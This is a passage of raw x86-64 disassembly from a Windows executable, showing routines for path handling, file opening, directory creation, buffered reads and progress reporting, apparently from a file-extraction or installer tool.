   140005149:	8b d6                	mov    %esi,%edx
   14000514b:	e8 b8 be ff ff       	call   0x140001008
   140005150:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140005154:	48 8b c8             	mov    %rax,%rcx
   140005157:	48 ff c1             	inc    %rcx
   14000515a:	80 3c 0b 00          	cmpb   $0x0,(%rbx,%rcx,1)
   14000515e:	75 f7                	jne    0x140005157
   140005160:	80 7c 19 ff 5c       	cmpb   $0x5c,-0x1(%rcx,%rbx,1)
   140005165:	74 2a                	je     0x140005191
   140005167:	48 ff c0             	inc    %rax
   14000516a:	80 3c 03 00          	cmpb   $0x0,(%rbx,%rax,1)
   14000516e:	75 f7                	jne    0x140005167
   140005170:	80 7c 18 ff 2f       	cmpb   $0x2f,-0x1(%rax,%rbx,1)
   140005175:	74 1a                	je     0x140005191
   140005177:	4c 8d 05 9e 46 00 00 	lea    0x469e(%rip),%r8        # 0x14000981c
   14000517e:	48 8b d6             	mov    %rsi,%rdx
   140005181:	48 8b cb             	mov    %rbx,%rcx
   140005184:	e8 fb be ff ff       	call   0x140001084
   140005189:	85 c0                	test   %eax,%eax
   14000518b:	79 04                	jns    0x140005191
   14000518d:	33 c0                	xor    %eax,%eax
   14000518f:	eb 13                	jmp    0x1400051a4
   140005191:	4c 8b c7             	mov    %rdi,%r8
   140005194:	48 8b d6             	mov    %rsi,%rdx
   140005197:	48 8b cb             	mov    %rbx,%rcx
   14000519a:	e8 e5 be ff ff       	call   0x140001084
   14000519f:	b8 01 00 00 00       	mov    $0x1,%eax
   1400051a4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400051a9:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400051ae:	48 83 c4 20          	add    $0x20,%rsp
   1400051b2:	5f                   	pop    %rdi
   1400051b3:	c3                   	ret
   1400051b4:	cc                   	int3
   1400051b5:	cc                   	int3
   1400051b6:	cc                   	int3
   1400051b7:	cc                   	int3
   1400051b8:	cc                   	int3
   1400051b9:	cc                   	int3
   1400051ba:	cc                   	int3
   1400051bb:	cc                   	int3
   1400051bc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400051c1:	57                   	push   %rdi
   1400051c2:	48 83 ec 30          	sub    $0x30,%rsp
   1400051c6:	48 8b f9             	mov    %rcx,%rdi
   1400051c9:	48 ff 15 38 40 00 00 	rex.W call *0x4038(%rip)        # 0x140009208
   1400051d0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400051d5:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400051d8:	0f 84 85 00 00 00    	je     0x140005263
   1400051de:	c1 e8 04             	shr    $0x4,%eax
   1400051e1:	f7 d0                	not    %eax
   1400051e3:	83 e0 01             	and    $0x1,%eax
   1400051e6:	74 7b                	je     0x140005263
   1400051e8:	33 db                	xor    %ebx,%ebx
   1400051ea:	39 1d 10 84 00 00    	cmp    %ebx,0x8410(%rip)        # 0x14000d600
   1400051f0:	75 54                	jne    0x140005246
   1400051f2:	f6 05 1f 7b 00 00 01 	testb  $0x1,0x7b1f(%rip)        # 0x14000cd18
   1400051f9:	75 4b                	jne    0x140005246
   1400051fb:	4c 8b 05 26 76 00 00 	mov    0x7626(%rip),%r8        # 0x14000c828
   140005202:	4c 8d 0d 37 e6 ff ff 	lea    -0x19c9(%rip),%r9        # 0x140003840
   140005209:	48 c7 44 24 28 06 00 	movq   $0x6,0x28(%rsp)
   140005210:	00 00 
   140005212:	ba d3 07 00 00       	mov    $0x7d3,%edx
   140005217:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000521c:	48 89 3d 0d 86 00 00 	mov    %rdi,0x860d(%rip)        # 0x14000d830
   140005223:	e8 a0 28 00 00       	call   0x140007ac8
   140005228:	48 83 e8 06          	sub    $0x6,%rax
   14000522c:	74 18                	je     0x140005246
   14000522e:	48 83 e8 01          	sub    $0x1,%rax
   140005232:	74 2b                	je     0x14000525f
   140005234:	48 3d 32 08 00 00    	cmp    $0x832,%rax
   14000523a:	75 0a                	jne    0x140005246
   14000523c:	c7 05 ba 83 00 00 01 	movl   $0x1,0x83ba(%rip)        # 0x14000d600
   140005243:	00 00 00 
   140005246:	ba 80 00 00 00       	mov    $0x80,%edx
   14000524b:	48 8b cf             	mov    %rdi,%rcx
   14000524e:	48 ff 15 03 40 00 00 	rex.W call *0x4003(%rip)        # 0x140009258
   140005255:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000525a:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000525f:	8b c3                	mov    %ebx,%eax
   140005261:	eb 05                	jmp    0x140005268
   140005263:	b8 01 00 00 00       	mov    $0x1,%eax
   140005268:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000526d:	48 83 c4 30          	add    $0x30,%rsp
   140005271:	5f                   	pop    %rdi
   140005272:	c3                   	ret
   140005273:	cc                   	int3
   140005274:	cc                   	int3
   140005275:	cc                   	int3
   140005276:	cc                   	int3
   140005277:	cc                   	int3
   140005278:	cc                   	int3
   140005279:	cc                   	int3
   14000527a:	cc                   	int3
   14000527b:	cc                   	int3
   14000527c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005281:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140005286:	57                   	push   %rdi
   140005287:	48 83 ec 30          	sub    $0x30,%rsp
   14000528b:	ba 10 00 00 00       	mov    $0x10,%edx
   140005290:	48 8b f1             	mov    %rcx,%rsi
   140005293:	8d 4a 30             	lea    0x30(%rdx),%ecx
   140005296:	48 ff 15 2b 41 00 00 	rex.W call *0x412b(%rip)        # 0x1400093c8
   14000529d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400052a2:	48 8b f8             	mov    %rax,%rdi
   1400052a5:	48 85 c0             	test   %rax,%rax
   1400052a8:	75 2a                	jne    0x1400052d4
   1400052aa:	21 44 24 28          	and    %eax,0x28(%rsp)
   1400052ae:	45 33 c9             	xor    %r9d,%r9d
   1400052b1:	48 8b 0d 70 75 00 00 	mov    0x7570(%rip),%rcx        # 0x14000c828
   1400052b8:	45 33 c0             	xor    %r8d,%r8d
   1400052bb:	ba b5 04 00 00       	mov    $0x4b5,%edx
   1400052c0:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400052c7:	00 
   1400052c8:	e8 ff fa ff ff       	call   0x140004dcc
   1400052cd:	33 c0                	xor    %eax,%eax
   1400052cf:	e9 8f 00 00 00       	jmp    0x140005363
   1400052d4:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   1400052d8:	48 8b d3             	mov    %rbx,%rdx
   1400052db:	48 ff c2             	inc    %rdx
   1400052de:	80 3c 16 00          	cmpb   $0x0,(%rsi,%rdx,1)
   1400052e2:	75 f7                	jne    0x1400052db
   1400052e4:	48 ff c2             	inc    %rdx
   1400052e7:	b9 40 00 00 00       	mov    $0x40,%ecx
   1400052ec:	48 ff 15 d5 40 00 00 	rex.W call *0x40d5(%rip)        # 0x1400093c8
   1400052f3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400052f8:	48 89 07             	mov    %rax,(%rdi)
   1400052fb:	48 85 c0             	test   %rax,%rax
   1400052fe:	75 34                	jne    0x140005334
   140005300:	21 44 24 28          	and    %eax,0x28(%rsp)
   140005304:	45 33 c9             	xor    %r9d,%r9d
   140005307:	48 8b 0d 1a 75 00 00 	mov    0x751a(%rip),%rcx        # 0x14000c828
   14000530e:	45 33 c0             	xor    %r8d,%r8d
   140005311:	ba b5 04 00 00       	mov    $0x4b5,%edx
   140005316:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   14000531d:	00 
   14000531e:	e8 a9 fa ff ff       	call   0x140004dcc
   140005323:	48 8b cf             	mov    %rdi,%rcx
   140005326:	48 ff 15 43 3f 00 00 	rex.W call *0x3f43(%rip)        # 0x140009270
   14000532d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005332:	eb 99                	jmp    0x1400052cd
   140005334:	48 ff c3             	inc    %rbx
   140005337:	80 3c 1e 00          	cmpb   $0x0,(%rsi,%rbx,1)
   14000533b:	75 f7                	jne    0x140005334
   14000533d:	48 8d 53 01          	lea    0x1(%rbx),%rdx
   140005341:	4c 8b c6             	mov    %rsi,%r8
   140005344:	48 8b c8             	mov    %rax,%rcx
   140005347:	e8 bc bc ff ff       	call   0x140001008
   14000534c:	48 8b 0d b5 82 00 00 	mov    0x82b5(%rip),%rcx        # 0x14000d608
   140005353:	b8 01 00 00 00       	mov    $0x1,%eax
   140005358:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   14000535c:	48 89 3d a5 82 00 00 	mov    %rdi,0x82a5(%rip)        # 0x14000d608
   140005363:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005368:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000536d:	48 83 c4 30          	add    $0x30,%rsp
   140005371:	5f                   	pop    %rdi
   140005372:	c3                   	ret
   140005373:	cc                   	int3
   140005374:	cc                   	int3
   140005375:	cc                   	int3
   140005376:	cc                   	int3
   140005377:	cc                   	int3
   140005378:	cc                   	int3
   140005379:	cc                   	int3
   14000537a:	cc                   	int3
   14000537b:	cc                   	int3
   14000537c:	cc                   	int3
   14000537d:	cc                   	int3
   14000537e:	cc                   	int3
   14000537f:	cc                   	int3
   140005380:	48 8b c4             	mov    %rsp,%rax
   140005383:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140005387:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000538b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000538f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140005393:	41 55                	push   %r13
   140005395:	41 56                	push   %r14
   140005397:	41 57                	push   %r15
   140005399:	48 83 ec 40          	sub    $0x40,%rsp
   14000539d:	45 33 f6             	xor    %r14d,%r14d
   1400053a0:	4c 8d 2d 99 7c 00 00 	lea    0x7c99(%rip),%r13        # 0x14000d040
   1400053a7:	8b da                	mov    %edx,%ebx
   1400053a9:	48 8b f1             	mov    %rcx,%rsi
   1400053ac:	49 8b c5             	mov    %r13,%rax
   1400053af:	41 8d 7e 01          	lea    0x1(%r14),%edi
   1400053b3:	39 38                	cmp    %edi,(%rax)
   1400053b5:	74 13                	je     0x1400053ca
   1400053b7:	44 03 f7             	add    %edi,%r14d
   1400053ba:	48 8d 0d 7f 81 00 00 	lea    0x817f(%rip),%rcx        # 0x14000d540
   1400053c1:	48 83 c0 20          	add    $0x20,%rax
   1400053c5:	48 3b c1             	cmp    %rcx,%rax
   1400053c8:	7c e9                	jl     0x1400053b3
   1400053ca:	41 83 fe 28          	cmp    $0x28,%r14d
   1400053ce:	75 2d                	jne    0x1400053fd
   1400053d0:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   1400053d5:	45 33 c9             	xor    %r9d,%r9d
   1400053d8:	48 8b 0d 49 74 00 00 	mov    0x7449(%rip),%rcx        # 0x14000c828
   1400053df:	45 33 c0             	xor    %r8d,%r8d
   1400053e2:	ba bb 04 00 00       	mov    $0x4bb,%edx
   1400053e7:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400053ee:	00 
   1400053ef:	e8 d8 f9 ff ff       	call   0x140004dcc
   1400053f4:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400053f8:	e9 b9 01 00 00       	jmp    0x1400055b6
   1400053fd:	48 8d 15 fc 6d 00 00 	lea    0x6dfc(%rip),%rdx        # 0x14000c200
   140005404:	48 8b ce             	mov    %rsi,%rcx
   140005407:	48 ff 15 c2 3f 00 00 	rex.W call *0x3fc2(%rip)        # 0x1400093d0
   14000540e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005413:	85 c0                	test   %eax,%eax
   140005415:	75 3d                	jne    0x140005454
   140005417:	f7 c3 0b 01 00 00    	test   $0x10b,%ebx
   14000541d:	75 d5                	jne    0x1400053f4
   14000541f:	49 63 d6             	movslq %r14d,%rdx
   140005422:	48 8b ca             	mov    %rdx,%rcx
   140005425:	48 c1 e1 05          	shl    $0x5,%rcx
   140005429:	42 21 04 29          	and    %eax,(%rcx,%r13,1)
   14000542d:	48 8b 05 2c 81 00 00 	mov    0x812c(%rip),%rax        # 0x14000d560
   140005434:	42 83 64 29 10 00    	andl   $0x0,0x10(%rcx,%r13,1)
   14000543a:	4a 89 44 29 08       	mov    %rax,0x8(%rcx,%r13,1)
   14000543f:	8b 05 23 81 00 00    	mov    0x8123(%rip),%eax        # 0x14000d568
   140005445:	42 89 44 29 14       	mov    %eax,0x14(%rcx,%r13,1)
   14000544a:	42 89 7c 29 04       	mov    %edi,0x4(%rcx,%r13,1)
   14000544f:	e9 5f 01 00 00       	jmp    0x1400055b3
   140005454:	f6 c3 08             	test   $0x8,%bl
   140005457:	74 09                	je     0x140005462
   140005459:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000545d:	e9 2b 01 00 00       	jmp    0x14000558d
   140005462:	8b c3                	mov    %ebx,%eax
   140005464:	24 03                	and    $0x3,%al
   140005466:	f6 d8                	neg    %al
   140005468:	1b ed                	sbb    %ebp,%ebp
   14000546a:	81 e5 00 00 00 c0    	and    $0xc0000000,%ebp
   140005470:	81 c5 00 00 00 80    	add    $0x80000000,%ebp
   140005476:	0f ba e3 08          	bt     $0x8,%ebx
   14000547a:	73 1c                	jae    0x140005498
   14000547c:	0f ba e3 0a          	bt     $0xa,%ebx
   140005480:	73 04                	jae    0x140005486
   140005482:	8b df                	mov    %edi,%ebx
   140005484:	eb 22                	jmp    0x1400054a8
   140005486:	81 e3 00 02 00 00    	and    $0x200,%ebx
   14000548c:	f7 db                	neg    %ebx
   14000548e:	1b db                	sbb    %ebx,%ebx
   140005490:	83 e3 fe             	and    $0xfffffffe,%ebx
   140005493:	83 c3 04             	add    $0x4,%ebx
   140005496:	eb 10                	jmp    0x1400054a8
   140005498:	81 e3 00 02 00 00    	and    $0x200,%ebx
   14000549e:	f7 db                	neg    %ebx
   1400054a0:	1b db                	sbb    %ebx,%ebx
   1400054a2:	83 e3 02             	and    $0x2,%ebx
   1400054a5:	83 c3 03             	add    $0x3,%ebx
   1400054a8:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400054ae:	45 33 c9             	xor    %r9d,%r9d
   1400054b1:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1400054b8:	00 
   1400054b9:	45 33 c0             	xor    %r8d,%r8d
   1400054bc:	8b d5                	mov    %ebp,%edx
   1400054be:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   1400054c2:	48 8b ce             	mov    %rsi,%rcx
   1400054c5:	48 ff 15 6c 3e 00 00 	rex.W call *0x3e6c(%rip)        # 0x140009338
   1400054cc:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400054d1:	48 8b c8             	mov    %rax,%rcx
   1400054d4:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400054d8:	0f 85 af 00 00 00    	jne    0x14000558d
   1400054de:	83 fb 03             	cmp    $0x3,%ebx
   1400054e1:	0f 84 a6 00 00 00    	je     0x14000558d
   1400054e7:	80 3e 00             	cmpb   $0x0,(%rsi)
   1400054ea:	74 75                	je     0x140005561
   1400054ec:	8a 46 01             	mov    0x1(%rsi),%al
   1400054ef:	48 8d 7e 02          	lea    0x2(%rsi),%rdi
   1400054f3:	45 33 ff             	xor    %r15d,%r15d
   1400054f6:	3c 3a                	cmp    $0x3a,%al
   1400054f8:	75 0b                	jne    0x140005505
   1400054fa:	80 3f 5c             	cmpb   $0x5c,(%rdi)
   1400054fd:	75 06                	jne    0x140005505
   1400054ff:	48 8d 7e 03          	lea    0x3(%rsi),%rdi
   140005503:	eb 0f                	jmp    0x140005514
   140005505:	80 3e 5c             	cmpb   $0x5c,(%rsi)
   140005508:	75 0e                	jne    0x140005518
   14000550a:	3c 5c                	cmp    $0x5c,%al
   14000550c:	75 0a                	jne    0x140005518
   14000550e:	41 bf 02 00 00 00    	mov    $0x2,%r15d
   140005514:	8a 07                	mov    (%rdi),%al
   140005516:	eb 45                	jmp    0x14000555d
   140005518:	48 8d 7e 01          	lea    0x1(%rsi),%rdi
   14000551c:	eb 3f                	jmp    0x14000555d
   14000551e:	3c 5c                	cmp    $0x5c,%al
   140005520:	75 27                	jne    0x140005549
   140005522:	80 7f ff 3a          	cmpb   $0x3a,-0x1(%rdi)
   140005526:	74 21                	je     0x140005549
   140005528:	45 85 ff             	test   %r15d,%r15d
   14000552b:	74 05                	je     0x140005532
   14000552d:	41 ff cf             	dec    %r15d
   140005530:	eb 17                	jmp    0x140005549
   140005532:	33 d2                	xor    %edx,%edx
   140005534:	c6 07 00             	movb   $0x0,(%rdi)
   140005537:	48 8b ce             	mov    %rsi,%rcx
   14000553a:	48 ff 15 4f 3d 00 00 	rex.W call *0x3d4f(%rip)        # 0x140009290
   140005541:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005546:	c6 07 5c             	movb   $0x5c,(%rdi)
   140005549:	48 8b cf             	mov    %rdi,%rcx
   14000554c:	48 ff 15 d5 3f 00 00 	rex.W call *0x3fd5(%rip)        # 0x140009528
   140005553:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005558:	48 8b f8             	mov    %rax,%rdi
   14000555b:	8a 00                	mov    (%rax),%al
   14000555d:	84 c0                	test   %al,%al
   14000555f:	75 bd                	jne    0x14000551e
   140005561:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140005567:	45 33 c9             	xor    %r9d,%r9d
   14000556a:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140005571:	00 
   140005572:	45 33 c0             	xor    %r8d,%r8d
   140005575:	8b d5                	mov    %ebp,%edx
   140005577:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   14000557b:	48 8b ce             	mov    %rsi,%rcx
   14000557e:	48 ff 15 b3 3d 00 00 	rex.W call *0x3db3(%rip)        # 0x140009338
   140005585:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000558a:	48 8b c8             	mov    %rax,%rcx
   14000558d:	49 63 d6             	movslq %r14d,%rdx
   140005590:	48 8b c2             	mov    %rdx,%rax
   140005593:	48 c1 e0 05          	shl    $0x5,%rax
   140005597:	4a 89 4c 28 18       	mov    %rcx,0x18(%rax,%r13,1)
   14000559c:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   1400055a0:	74 0d                	je     0x1400055af
   1400055a2:	42 83 24 28 00       	andl   $0x0,(%rax,%r13,1)
   1400055a7:	42 83 64 28 04 00    	andl   $0x0,0x4(%rax,%r13,1)
   1400055ad:	eb 04                	jmp    0x1400055b3
   1400055af:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   1400055b3:	48 8b c2             	mov    %rdx,%rax
   1400055b6:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400055bb:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   1400055c0:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   1400055c5:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   1400055ca:	48 83 c4 40          	add    $0x40,%rsp
   1400055ce:	41 5f                	pop    %r15
   1400055d0:	41 5e                	pop    %r14
   1400055d2:	41 5d                	pop    %r13
   1400055d4:	c3                   	ret
   1400055d5:	cc                   	int3
   1400055d6:	cc                   	int3
   1400055d7:	cc                   	int3
   1400055d8:	cc                   	int3
   1400055d9:	cc                   	int3
   1400055da:	cc                   	int3
   1400055db:	cc                   	int3
   1400055dc:	cc                   	int3
   1400055dd:	cc                   	int3
   1400055de:	cc                   	int3
   1400055df:	cc                   	int3
   1400055e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400055e5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400055ea:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   1400055ef:	57                   	push   %rdi
   1400055f0:	48 83 ec 30          	sub    $0x30,%rsp
   1400055f4:	48 8b f9             	mov    %rcx,%rdi
   1400055f7:	48 8d 35 42 7a 00 00 	lea    0x7a42(%rip),%rsi        # 0x14000d040
   1400055fe:	48 c1 e7 05          	shl    $0x5,%rdi
   140005602:	4c 8b d2             	mov    %rdx,%r10
   140005605:	8b 4c 37 04          	mov    0x4(%rdi,%rsi,1),%ecx
   140005609:	85 c9                	test   %ecx,%ecx
   14000560b:	74 34                	je     0x140005641
   14000560d:	83 f9 01             	cmp    $0x1,%ecx
   140005610:	74 05                	je     0x140005617
   140005612:	83 cb ff             	or     $0xffffffff,%ebx
   140005615:	eb 54                	jmp    0x14000566b
   140005617:	8b 5c 37 14          	mov    0x14(%rdi,%rsi,1),%ebx
   14000561b:	49 8b ca             	mov    %r10,%rcx
   14000561e:	2b 5c 37 10          	sub    0x10(%rdi,%rsi,1),%ebx
   140005622:	48 63 54 37 10       	movslq 0x10(%rdi,%rsi,1),%rdx
   140005627:	44 3b c3             	cmp    %ebx,%r8d
   14000562a:	41 0f 42 d8          	cmovb  %r8d,%ebx
   14000562e:	48 03 54 37 08       	add    0x8(%rdi,%rsi,1),%rdx
   140005633:	4c 63 c3             	movslq %ebx,%r8
   140005636:	e8 c2 34 00 00       	call   0x140008afd
   14000563b:	01 5c 37 10          	add    %ebx,0x10(%rdi,%rsi,1)
   14000563f:	eb 2a                	jmp    0x14000566b
   140005641:	48 8b 4c 37 18       	mov    0x18(%rdi,%rsi,1),%rcx
   140005646:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000564b:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140005651:	48 ff 15 58 3c 00 00 	rex.W call *0x3c58(%rip)        # 0x1400092b0
   140005658:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000565d:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140005661:	83 cb ff             	or     $0xffffffff,%ebx
   140005664:	85 c0                	test   %eax,%eax
   140005666:	0f 44 cb             	cmove  %ebx,%ecx
   140005669:	8b d9                	mov    %ecx,%ebx
   14000566b:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140005670:	8b c3                	mov    %ebx,%eax
   140005672:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005677:	48 83 c4 30          	add    $0x30,%rsp
   14000567b:	5f                   	pop    %rdi
   14000567c:	c3                   	ret
   14000567d:	cc                   	int3
   14000567e:	cc                   	int3
   14000567f:	cc                   	int3
   140005680:	cc                   	int3
   140005681:	cc                   	int3
   140005682:	cc                   	int3
   140005683:	cc                   	int3
   140005684:	cc                   	int3
   140005685:	cc                   	int3
   140005686:	cc                   	int3
   140005687:	cc                   	int3
   140005688:	cc                   	int3
   140005689:	cc                   	int3
   14000568a:	cc                   	int3
   14000568b:	cc                   	int3
   14000568c:	cc                   	int3
   14000568d:	cc                   	int3
   14000568e:	cc                   	int3
   14000568f:	cc                   	int3
   140005690:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005695:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   14000569a:	57                   	push   %rdi
   14000569b:	48 83 ec 30          	sub    $0x30,%rsp
   14000569f:	48 8b d9             	mov    %rcx,%rbx
   1400056a2:	48 8b fa             	mov    %rdx,%rdi
   1400056a5:	48 8b 0d 8c 71 00 00 	mov    0x718c(%rip),%rcx        # 0x14000c838
   1400056ac:	e8 8f e4 ff ff       	call   0x140003b40
   1400056b1:	83 3d 44 7f 00 00 00 	cmpl   $0x0,0x7f44(%rip)        # 0x14000d5fc
   1400056b8:	74 08                	je     0x1400056c2
   1400056ba:	83 c8 ff             	or     $0xffffffff,%eax
   1400056bd:	e9 95 00 00 00       	jmp    0x140005757
   1400056c2:	44 8b 44 24 50       	mov    0x50(%rsp),%r8d
   1400056c7:	48 8d 0d 8a 79 00 00 	lea    0x798a(%rip),%rcx        # 0x14000d058
   1400056ce:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400056d4:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   1400056d9:	48 c1 e3 05          	shl    $0x5,%rbx
   1400056dd:	48 8b d7             	mov    %rdi,%rdx
   1400056e0:	48 8b 0c 0b          	mov    (%rbx,%rcx,1),%rcx
   1400056e4:	48 ff 15 d5 3b 00 00 	rex.W call *0x3bd5(%rip)        # 0x1400092c0
   1400056eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400056f0:	85 c0                	test   %eax,%eax
   1400056f2:	75 05                	jne    0x1400056f9
   1400056f4:	83 cb ff             	or     $0xffffffff,%ebx
   1400056f7:	eb 5c                	jmp    0x140005755
   1400056f9:	8b 5c 24 50          	mov    0x50(%rsp),%ebx
   1400056fd:	83 fb ff             	cmp    $0xffffffff,%ebx
   140005700:	74 53                	je     0x140005755
   140005702:	8b 15 24 81 00 00    	mov    0x8124(%rip),%edx        # 0x14000d82c
   140005708:	03 d3                	add    %ebx,%edx
   14000570a:	83 3d 9b 6a 00 00 00 	cmpl   $0x0,0x6a9b(%rip)        # 0x14000c1ac
   140005711:	89 15 15 81 00 00    	mov    %edx,0x8115(%rip)        # 0x14000d82c
   140005717:	74 3c                	je     0x140005755
   140005719:	48 8b 0d 08 71 00 00 	mov    0x7108(%rip),%rcx        # 0x14000c828
   140005720:	48 85 c9             	test   %rcx,%rcx
   140005723:	74 30                	je     0x140005755
   140005725:	44 8b 05 f8 80 00 00 	mov    0x80f8(%rip),%r8d        # 0x14000d824
   14000572c:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140005732:	48 6b c2 64          	imul   $0x64,%rdx,%rax
   140005736:	33 d2                	xor    %edx,%edx
   140005738:	49 f7 f0             	div    %r8
   14000573b:	ba 3a 08 00 00       	mov    $0x83a,%edx
   140005740:	41 b8 02 04 00 00    	mov    $0x402,%r8d
   140005746:	4c 8b c8             	mov    %rax,%r9
   140005749:	48 ff 15 90 3d 00 00 	rex.W call *0x3d90(%rip)        # 0x1400094e0
   140005750:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005755:	8b c3                	mov    %ebx,%eax
   140005757:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000575c:	48 83 c4 30          	add    $0x30,%rsp
   140005760:	5f                   	pop    %rdi
   140005761:	c3                   	ret
   140005762:	cc                   	int3
   140005763:	cc                   	int3
   140005764:	cc                   	int3
   140005765:	cc                   	int3
   140005766:	cc                   	int3
   140005767:	cc                   	int3
   140005768:	cc                   	int3
   140005769:	cc                   	int3
   14000576a:	cc                   	int3
   14000576b:	cc                   	int3
   14000576c:	cc                   	int3
   14000576d:	cc                   	int3
   14000576e:	cc                   	int3
   14000576f:	cc                   	int3
   140005770:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005775:	57                   	push   %rdi
   140005776:	48 83 ec 20          	sub    $0x20,%rsp
   14000577a:	48 8b d9             	mov    %rcx,%rbx
   14000577d:	48 8d 3d bc 78 00 00 	lea    0x78bc(%rip),%rdi        # 0x14000d040
   140005784:	48 c1 e3 05          	shl    $0x5,%rbx
   140005788:	83 7c 3b 04 01       	cmpl   $0x1,0x4(%rbx,%rdi,1)
   14000578d:	75 15                	jne    0x1400057a4
   14000578f:	33 c9                	xor    %ecx,%ecx
   140005791:	c7 04 3b 01 00 00 00 	movl   $0x1,(%rbx,%rdi,1)
   140005798:	48 89 4c 3b 08       	mov    %rcx,0x8(%rbx,%rdi,1)
   14000579d:	48 89 4c 3b 10       	mov    %rcx,0x10(%rbx,%rdi,1)
   1400057a2:	eb 23                	jmp    0x1400057c7
   1400057a4:	48 8b 4c 3b 18       	mov    0x18(%rbx,%rdi,1),%rcx
   1400057a9:	48 ff 15 88 3a 00 00 	rex.W call *0x3a88(%rip)        # 0x140009238
   1400057b0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400057b5:	33 c9                	xor    %ecx,%ecx
   1400057b7:	85 c0                	test   %eax,%eax
   1400057b9:	74 09                	je     0x1400057c4
   1400057bb:	c7 04 3b 01 00 00 00 	movl   $0x1,(%rbx,%rdi,1)
   1400057c2:	eb 03                	jmp    0x1400057c7
   1400057c4:	83 c9 ff             	or     $0xffffffff,%ecx
   1400057c7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400057cc:	8b c1                	mov    %ecx,%eax
   1400057ce:	48 83 c4 20          	add    $0x20,%rsp
   1400057d2:	5f                   	pop    %rdi
   1400057d3:	c3                   	ret
   1400057d4:	cc                   	int3
   1400057d5:	cc                   	int3
   1400057d6:	cc                   	int3
   1400057d7:	cc                   	int3
   1400057d8:	cc                   	int3
   1400057d9:	cc                   	int3
   1400057da:	cc                   	int3
   1400057db:	cc                   	int3
   1400057dc:	cc                   	int3
   1400057dd:	cc                   	int3
   1400057de:	cc                   	int3
   1400057df:	cc                   	int3
   1400057e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400057e4:	48 c1 e1 05          	shl    $0x5,%rcx
   1400057e8:	4c 8d 15 51 78 00 00 	lea    0x7851(%rip),%r10        # 0x14000d040
   1400057ef:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1400057f5:	46 39 4c 11 04       	cmp    %r9d,0x4(%rcx,%r10,1)
   1400057fa:	75 22                	jne    0x14000581e
   1400057fc:	45 85 c0             	test   %r8d,%r8d
   1400057ff:	74 16                	je     0x140005817
   140005801:	45 2b c1             	sub    %r9d,%r8d
   140005804:	74 0c                	je     0x140005812
   140005806:	45 3b c1             	cmp    %r9d,%r8d
   140005809:	75 22                	jne    0x14000582d
   14000580b:	42 03 54 11 14       	add    0x14(%rcx,%r10,1),%edx
